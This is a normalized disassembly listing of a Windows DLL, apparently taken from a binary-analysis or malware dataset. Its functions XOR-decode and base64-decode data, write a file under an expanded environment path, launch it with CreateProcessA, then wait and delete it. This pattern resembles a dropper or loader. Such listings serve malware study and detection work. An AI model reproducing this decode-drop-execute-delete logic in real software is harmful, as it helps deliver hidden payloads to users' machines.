push [ ebp + 0x8 ]
call sub_100036a6
and [ ebp - 0x4 ] 0x0
mov esi eax
mov eax [ esi + 0x8 ]
pop ecx
test eax eax
je r-xdata
mov ecx esi
call sub_10003098
push esi
call sub_10002139
mov eax [ ebp - 0x8 ]
pop ecx
pop esi
leave
retn
push ebx
push edi
push ebx
mov ecx esi
call sub_100034f8
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
jne r-xdata
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
pop edi
pop ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jb r-xdata
push ebx
mov ecx esi
call sub_100034f8
cmp edi [ eax + 0x8 ]
je r-xdata
jmp r-xdata
push [ ebp - 0x4 ]
mov ecx esi
call sub_100034f8
mov edi [ eax + 0x4 ]
xor ebx ebx
sub_100037da
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi 0x250dfa8f
test edi edi
je r-xdata
push esi
call sub_10003761
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
pop edi
pop esi
pop ebp
retn
push esi
call sub_100035d7
pop ecx
test eax eax
jne r-xdata
mov esi 0xbd3cc33a
test edi edi
je r-xdata
push esi
call sub_10003761
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100035d7
pop ecx
test eax eax
jne r-xdata
mov esi 0x7a38ebf3
test edi edi
je r-xdata
push esi
call sub_10003761
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100035d7
pop ecx
test eax eax
jne r-xdata
mov esi 0x4a36abf3
test edi edi
je r-xdata
push esi
call sub_10003761
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100035d7
pop ecx
test eax eax
jne r-xdata
mov esi 0x7712feae
test edi edi
je r-xdata
push esi
call sub_10003761
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100035d7
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
sub_10003895
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_10002bf3
cmp [ eax + edi - 0x1 ] 0x5c
pop ecx
mov esi r--data
je r-xdata
push edi
call sub_10002df7
pop ecx
push esi
push r--data
push edi
call sub_10002e4c
add esp 0xc
jmp r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_10002e4c
push 0x13c
mov edi eax
lea eax [ ebp - 0x144 ]
push ebx
push eax
mov [ ebp - 0x148 ] ebx
call sub_10004195
add esp 0x18
lea eax [ ebp - 0x148 ]
push eax
push edi
call sub_10001c59
cmp eax 0xffffffff
push edi
mov [ ebp - 0x8 ] eax
setne [ ebp + 0xb ]
call sub_10002139
cmp [ ebp + 0xb ] bl
pop ecx
jmp r-xdata
push 0x13c
lea eax [ ebp - 0x284 ]
push ebx
push eax
mov [ ebp - 0x288 ] ebx
call sub_10004195
push esi
push r--data
push [ ebp - 0x4 ]
call sub_10002e4c
mov edi eax
add esp 0x18
lea eax [ ebp - 0x288 ]
push eax
push edi
call sub_10001c59
push edi
mov [ ebp + 0x8 ] eax
call sub_10002139
cmp [ ebp + 0x8 ] 0xffffffff
pop ecx
jne r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] bl
je r-xdata
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push 0xffffffff
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push [ ebp - 0x8 ]
test [ ebp - 0x288 ] 0x10
je r-xdata
push 0xc
call sub_1000223c
pop ecx
cmp eax ebx
je r-xdata
call sub_10001c8b
push [ ebp - 0x4 ]
call sub_10002139
pop ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] bl
je r-xdata
push 0xc
call sub_1000223c
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x288 ]
push eax
push [ ebp + 0x8 ]
call sub_10001c72
test eax eax
jne r-xdata
lea eax [ ebp - 0x25c ]
push r--data
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
lea eax [ ebp - 0x11c ]
push r--data
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
jne r-xdata
test [ ebp - 0x148 ] 0x10
jne r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10001c8b
lea eax [ ebp - 0x25c ]
push r--data
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x148 ]
push eax
push [ ebp - 0x8 ]
call sub_10001c72
test eax eax
lea eax [ ebp - 0x11c ]
push r--data
push eax
call sub_10002db0
pop ecx
pop ecx
test al al
jne r-xdata
push esi
push r--data
lea eax [ ebp - 0x25c ]
push eax
push [ ebp - 0x4 ]
call sub_10002e4c
add esp 0x10
mov edi eax
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
test [ ebp - 0x148 ] eax
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0xc
call sub_1000223c
pop ecx
cmp eax ebx
je r-xdata
push esi
lea eax [ ebp - 0x11c ]
push eax
push [ ebp - 0x4 ]
call sub_10002e4c
mov ecx [ ebp + 0x14 ]
add esp 0xc
mov edi eax
push edi
call sub_10002f67
push edi
call sub_10002139
pop ecx
push 0x1
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10003895
push edi
call sub_10002139
add esp 0x18
push r--data
push [ ebp + 0xc ]
call sub_10002db0
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push edi
call sub_10002f67
sub_10003b37
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
mov [ ebp - 0xc ] ecx
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax ecx
leave
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
inc ecx
mov [ ebp - 0xc ] ecx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0xc ]
add ecx eax
mov dl [ ecx ]
mov al [ esi ]
and [ ebp - 0x8 ] 0x0
test al al
je r-xdata
pop esi
mov al [ ebp - 0xc ]
imul [ ebp - 0x8 ]
add al [ ebp - 0x1 ]
xor dl al
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ecx ] dl
mov al [ eax + esi ]
mov [ ebp - 0x1 ] al
test al al
jne r-xdata
sub_10003b91
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ CryptBinaryToStringA@IAT ]
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0x1
mov ebx r--data
push ebx
call [ eax ]
push [ ebp - 0x4 ]
call sub_100046e2
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x1
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x2
push ebx
call [ esi ]
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10003c21
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ CryptStringToBinaryA@IAT ]
push edi
xor eax eax
push eax
push eax
push [ ebp + 0x10 ]
push eax
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x3
mov ebx r--data
push ebx
call [ eax ]
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
push eax
call sub_100046e2
pop ecx
push 0x0
push 0x0
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
push eax
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x4
push ebx
call [ esi ]
mov eax [ ebp - 0x4 ]
sub_10003cb8
push esi
push 0x4
mov esi ecx
call sub_100046cb
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10004534
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10003b8d
jmp r-xdata
push 0x4
mov [ esi + 0x8 ] eax
call sub_100046cb
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003b8d
jmp r-xdata
push 0x1
mov [ esi ] eax
call sub_100046cb
pop ecx
test eax eax
je r-xdata
mov [ esi + 0x4 ] eax
mov eax esi
pop esi
retn
sub_10003d0c
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push 0xffffffff
mov [ ebp - 0xc ] ecx
mov ecx [ ecx + 0x8 ]
push 0x1010101
call sub_10004540
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
xor eax 0xaa7d756
cmp [ ebp + 0x10 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push eax
je r-xdata
call sub_100046e2
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
push [ ebp + 0x8 ]
push eax
call sub_10004144
mov ecx [ ebp - 0x4 ]
add esp 0x10
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call sub_10004069
movzx eax ax
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0x10 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0x10 ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
mov eax [ ebp + 0xc ]
add eax 0x2
push eax
mov [ ebp - 0x4 ] eax
call sub_100046e2
push 0x2
lea ecx [ ebp - 0x10 ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_10004144
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push [ ebp + 0x8 ]
add eax 0x2
push eax
call sub_10004144
mov ecx [ ebp - 0x4 ]
add esp 0x1c
mov [ ebp - 0x4 ] ecx
jmp r-xdata
lea eax [ ecx + 0x4 ]
push eax
mov [ ebp + 0x8 ] eax
call sub_100046e2
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push eax
mov [ ebp + 0xc ] eax
call sub_10004144
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
add eax 0x4
push eax
call sub_10004144
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
add esp 0x1c
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10003b91
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
push [ ebp + 0xc ]
call sub_1000470c
push [ ebp + 0x10 ]
call sub_1000470c
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0xc
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
add eax edx
and edx 0x3
mov dl [ ebp + edx - 0x14 ]
xor [ eax ] dl
inc [ ebp + 0xc ]
cmp [ ebp + 0xc ] ecx
jb r-xdata
and [ ebp + 0xc ] 0x0
test ecx ecx
je r-xdata
sub_10003e95
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ecx ]
call sub_10003c21
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x4
mov ebx r--data
push ebx
call [ esi ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x8 ] 0x0
push 0x4
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
call sub_10004144
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
xor eax 0xaa7d756
add esi 0xfffffffc
push esi
mov [ ebp + 0xc ] eax
call sub_100046e2
mov [ ebp + 0x8 ] eax
add esp 0x10
xor eax eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
and [ ebp - 0x10 ] 0x0
push 0x2
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10004144
mov eax [ ebp + 0x10 ]
add esi 0xfffffffe
mov [ eax ] esi
lea eax [ esi + 0x1 ]
push eax
call sub_100046e2
mov ecx [ ebp + 0x8 ]
push esi
add ecx 0x2
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_10004144
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x4 ]
add esp 0x1c
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x10 ]
call sub_100040b7
mov [ ebp + 0xf ] al
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x5
push ebx
call [ esi ]
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
and ecx 0x3
mov cl [ ebp + ecx + 0xc ]
xor cl [ edx + eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ eax + edx ] cl
inc eax
cmp eax esi
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
push [ ebp + 0x8 ]
call sub_1000470c
push [ ebp - 0x4 ]
call sub_1000470c
mov eax [ ebp + 0x10 ]
pop ecx
pop ecx
push [ ebp + 0x10 ]
call sub_1000470c
and [ ebp + 0x10 ] 0x0
pop ecx
sub_10003fd4
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0xc ]
lea eax [ edi + 0x1 ]
push eax
call sub_100046e2
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
leave
retn 0x8
push esi
xor esi esi
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop esi
mov edi [ ebp + 0x8 ]
sub edi eax
push ebx
mov eax [ ebp - 0x4 ]
lea ecx [ esi + eax ]
xor edx edx
push 0xb
mov eax esi
pop ebx
div ebx
mov al [ edx + r--data ]
xor al [ edi + ecx ]
inc esi
mov [ ecx ] al
cmp esi [ ebp + 0xc ]
jl r-xdata
pop ebx
sub_10004024
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov ecx edi
call sub_1000444a
push edi
call sub_100046eb
pop ecx
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
mov ecx edi
call sub_10003b90
push edi
call sub_100046eb
pop ecx
pop edi
pop esi
retn
mov ecx esi
call sub_10003b90
push esi
call sub_100046eb
pop ecx
sub_10004069
push ebp
mov ebp esp
push ecx
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] ecx
jbe r-xdata
mov ax [ ebp - 0x4 ]
leave
retn 0x8
push esi
shr [ ebp - 0x4 ] 0x1
mov edx 0x2042
xor dx [ ebp - 0x4 ]
shr dx 0x1
movzx edx dx
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dl al
xor dl [ ebp - 0x4 ]
test dl 0x1
je r-xdata
inc ecx
cmp ecx [ ebp + 0xc ]
jb r-xdata
shr al 0x1
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ ecx + eax ]
push 0x8
pop esi
pop esi
sub_100040d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl dl
je r-xdata
pop ebp
retn
inc eax
xor eax eax
sub_100040ee
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
cmp [ esi ] 0x0
mov [ ebp + 0x8 ] eax
je r-xdata
pop esi
pop ebp
retn
mov dl [ eax ]
push edi
test dl dl
je r-xdata
xor eax eax
sub eax esi
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx ]
inc eax
test dl dl
jne r-xdata
movsx edi [ eax + ecx ]
movsx edx dl
sub edi edx
jne r-xdata
pop edi
mov ecx esi
test dl dl
je r-xdata
inc ecx
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_10004144
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub ecx eax
mov dl [ eax ]
dec [ ebp + 0x10 ]
mov [ ecx + eax ] dl
inc eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub_10004169
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ eax ]
movzx ecx [ ecx ]
sub eax ecx
pop ebp
retn
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
inc eax
inc ecx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_10004195
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
movzx eax [ ebp + 0xc ]
imul eax eax 0x1010101
mov edx ecx
push ebx
push edi
mov edi [ ebp + 0x8 ]
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
sub_100041c3
push ebp
mov ebp esp
push ecx
stmxcsr [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x1f80
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
lea eax [ esi + 0x10 ]
push eax
call [ DeleteFileA@IAT ]
push esi
call sub_1000470c
pop ecx
xor eax eax
pop esi
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
leave
retn 0x4
sub_10004204
push ebx
push esi
push 0xc
mov esi ecx
call sub_100046cb
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_10003cb8
jmp r-xdata
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] bx
mov eax esi
pop esi
pop ebx
retn
sub_10004247
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ExpandEnvironmentStringsA@IAT ]
push edi
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov edi ecx
call esi
mov ebx eax
push ebx
call sub_100046e2
pop ecx
push ebx
push eax
push [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_1000428a
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor ebx ebx
mov esi ecx
push ebx
push [ esi + 0x8 ]
call [ CreateDirectoryA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x3
je r-xdata
pop esi
pop ebx
leave
retn 0x8
push edi
push 0x401
call sub_100046e2
push [ esi + 0x4 ]
mov edi [ wsprintfA@IAT ]
push [ esi + 0x8 ]
mov [ ebp - 0x4 ] eax
push r--data
push eax
call edi
add esp 0x14
push ebx
push ebx
push 0x2
push ebx
push 0x2
push 0x40000000
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
call [ CreateFileA@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call sub_1000470c
pop ecx
pop edi
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push [ ebp + 0xc ]
mov [ ebp - 0xc ] ebx
push [ ebp + 0x8 ]
push eax
call [ WriteFile@IAT ]
push [ ebp - 0x8 ]
mov [ ebp + 0xc ] eax
call [ CloseHandle@IAT ]
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0x44
call sub_100046cb
push 0x10
mov [ ebp - 0x8 ] eax
mov [ eax ] 0x44
mov [ eax + 0x2c ] 0x1
call sub_100046cb
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
cmp [ esi + 0x10 ] bl
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
push eax
push [ ebp - 0x8 ]
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp - 0x4 ]
call [ CreateProcessA@IAT ]
jmp r-xdata
cmp [ esi + 0x11 ] bl
je r-xdata
push 0x401
call sub_100046e2
pop ecx
mov ecx [ esi ]
push 0xc
push r--data
mov [ ebp + 0xc ] eax
call sub_10003fd4
push [ esi + 0xc ]
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
push eax
push r--data
push [ ebp + 0xc ]
call edi
add esp 0x14
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0xc ]
push ebx
call [ CreateProcessA@IAT ]
push [ ebp - 0x10 ]
call sub_1000470c
push [ ebp + 0xc ]
call sub_1000470c
pop ecx
pop ecx
push [ ebp + 0x8 ]
call sub_100046eb
push [ ebp - 0x8 ]
call sub_100046eb
pop ecx
pop ecx
mov edi [ ebp - 0x14 ]
lea eax [ edi + 0x11 ]
push eax
call sub_100046e2
push 0x10
push [ ebp + 0x8 ]
mov esi eax
push esi
call sub_10004144
push edi
push [ ebp - 0x4 ]
lea eax [ esi + 0x10 ]
push eax
call sub_10004144
add esp 0x1c
push ebx
push ebx
push esi
push sub_100041c3
push ebx
push ebx
call [ CreateThread@IAT ]
sub_10004420
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
push [ esi + 0x8 ]
call sub_1000470c
pop ecx
pop edi
mov [ esi + 0x10 ] 0x0
pop esi
retn
mov ecx edi
call sub_10004024
push edi
call sub_100046eb
pop ecx
sub_10004453
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x0
call esi
lea eax [ ebp - 0xc ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x5
mov ebx r--data
push ebx
call [ eax ]
push 0x0
call esi
lea eax [ ebp - 0x14 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x6
push ebx
call [ eax ]
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x14 ]
xor edi [ ebp - 0x8 ]
xor ebx [ ebp - 0x10 ]
push 0x0
call esi
call [ GetTickCount@IAT ]
xor eax ebx
xor eax edi
pop edi
pop esi
pop ebx
leave
retn
sub_100044ec
push esi
push 0x3e
mov esi ecx
call sub_100046e2
mov [ esi ] eax
pop ecx
mov al 0x30
mov edx [ esi ]
lea ecx [ eax - 0x30 ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x3a
jl r-xdata
mov al 0x41
mov edx [ esi ]
lea ecx [ eax - 0x37 ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x5b
jl r-xdata
mov al 0x61
mov edx [ esi ]
lea ecx [ eax - 0x3d ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x7b
jl r-xdata
pop esi
retn
sub_1000455c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x1 ]
push edi
push eax
mov ebx ecx
call sub_100046e2
xor edi edi
pop ecx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ecx ebx
call sub_10004453
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x4
push r--data
call [ esi ]
mov eax [ ebp - 0x8 ]
xor edx edx
push 0x3e
pop ecx
div ecx
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
mov al [ edx + eax ]
mov [ edi + ecx ] al
inc edi
cmp edi [ ebp + 0x8 ]
jb r-xdata
sub_100045cf
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
push 0x1
call sub_10004540
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
mov eax [ ebp + 0x8 ]
inc eax
imul eax [ ebp - 0x8 ]
inc eax
push eax
call sub_100046e2
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
push 0x1
call sub_10004540
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
push [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_1000455c
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
push r--data
push eax
call [ wsprintfA@IAT ]
push [ ebp - 0x8 ]
add [ ebp - 0x4 ] eax
call sub_1000470c
add esp 0x10
dec [ ebp - 0x10 ]
jne r-xdata
sub_100046eb
push ebp
mov ebp esp
call [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push eax
call [ HeapFree@IAT ]
sub_10004715
push ebp
mov ebp esp
sub esp 0x11c
push esi
push edi
xor esi esi
xor eax eax
push 0xfe
mov [ ebp - 0x108 ] ax
lea eax [ ebp - 0x106 ]
push esi
push eax
mov [ ebp - 0x11c ] 0x11c
mov [ ebp - 0x118 ] esi
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x10c ] esi
call sub_10004195
add esp 0xc
push 0x3
push 0x20
push 0x3
push 0x1
push 0x3
push 0x2
xor eax eax
push esi
push esi
mov esi [ VerSetConditionMask@IAT ]
mov [ ebp - 0x8 ] ax
mov [ ebp - 0x6 ] ax
lea edi [ ebp - 0x4 ]
stosd [ edi ]
call esi
push edx
push eax
call esi
push edx
push eax
call esi
movzx ecx [ ebp + 0x8 ]
mov [ ebp - 0x118 ] ecx
movzx ecx [ ebp + 0xc ]
push edx
push eax
mov [ ebp - 0x114 ] ecx
mov cx [ ebp + 0x10 ]
push 0x23
lea eax [ ebp - 0x11c ]
push eax
mov [ ebp - 0x8 ] cx
call [ VerifyVersionInfoW@IAT ]
neg eax
sbb eax eax
pop edi
neg eax
pop esi
leave
retn
sub_100047c5
push ebp
